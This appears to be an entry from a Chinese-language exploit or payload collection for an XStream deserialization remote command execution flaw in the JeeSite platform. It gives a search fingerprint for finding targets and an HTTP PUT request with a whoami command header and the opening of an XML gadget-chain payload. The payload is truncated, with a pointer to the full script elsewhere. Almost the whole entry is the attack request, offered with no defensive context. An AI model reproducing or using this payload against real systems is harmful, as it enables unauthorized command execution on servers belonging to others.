# JeeSite快速开发平台Xstream反序列化RCE漏洞

- **系统**：JeeSite　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="jeesite"`

**请求体 / payload**
```
**PUT** /act/service/model/poiuyt/save **HTTP/1.1**
**Host**:
**Content-Type**: **application/xml**
**User-Agent**: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
X-Token: whoami
**<sorted-set>**
**    <javax.naming.ldap.Rdn_-RdnEntry>**
**        <type>gadget-chains</type>**
**        <value class**=**"javax.activation.MimeTypeParameterList">**
**            <parameters class**=**"javax.swing.UIDefaults"**** serialization**=**"custom">**
**                <unserializable-parents/>**
**                <hashtable>**
**                    <default>**
**         …（脚本共 6614 字，完整版见原文）
```
- **预期**：200　|　—